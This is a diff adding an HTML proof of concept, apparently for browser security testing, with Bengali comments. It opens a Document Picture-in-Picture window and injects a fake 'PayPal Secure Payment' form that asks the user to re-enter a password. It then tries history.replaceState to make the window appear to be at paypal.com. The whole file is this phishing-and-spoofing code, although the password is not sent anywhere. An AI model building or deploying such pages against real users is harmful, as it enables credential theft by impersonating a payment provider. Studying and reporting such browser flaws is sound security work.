@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PiP Address Spoof Test</title>
+</head>
+<body>
+    <h1>Document PiP Security Test</h1>
+    <p>নিচের বাটনে ক্লিক করলে একটি PiP উইন্ডো খুলবে।</p>
+    <button id="pipButton">Open PiP Window</button>
+
+    <script>
+        const pipButton = document.getElementById('pipButton');
+
+        pipButton.addEventListener('click', async () => {
+            // ১. একটি Document PiP উইন্ডো রিকোয়েস্ট করা
+            const pipWindow = await documentPictureInPicture.requestWindow({
+                width: 400,
+                height: 300,
+            });
+
+            // ২. উইন্ডোর ভেতরে ফেক কন্টেন্ট ইনজেক্ট করা
+            pipWindow.document.body.innerHTML = `
+                <div style="font-family: Arial; padding: 20px; text-align: center;">
+                    <h2 style="color: #0070ba;">PayPal Secure Payment</h2>
+                    <p>Your session is about to expire. Please re-enter password:</p>
+                    <input type="password" placeholder="Password" style="width: 80%; padding: 8px;">
+                    <br><br>
+                    <button style="background: #0070ba; color: white; border: none; padding: 10px 20px; border-radius: 5px;">Confirm Payment</button>
+                </div>
+            `;
+
+            // ৩. স্পুফিং লজিক (ভবিষ্যতের বাগ বা নির্দিষ্ট ব্রাউজারে কাজ করতে পারে)
+            // অনেক সময় navigation বা history.replaceState ব্যবহার করে URL পরিবর্তন করার চেষ্টা করা হয়।
+            try {
+                pipWindow.history.replaceState({}, '', 'https://paypal.com');
+            } catch (e) {
+                console.log("URL spoofing blocked by browser security.");
+            }
+        });
+    </script>
+</body>
+</html>
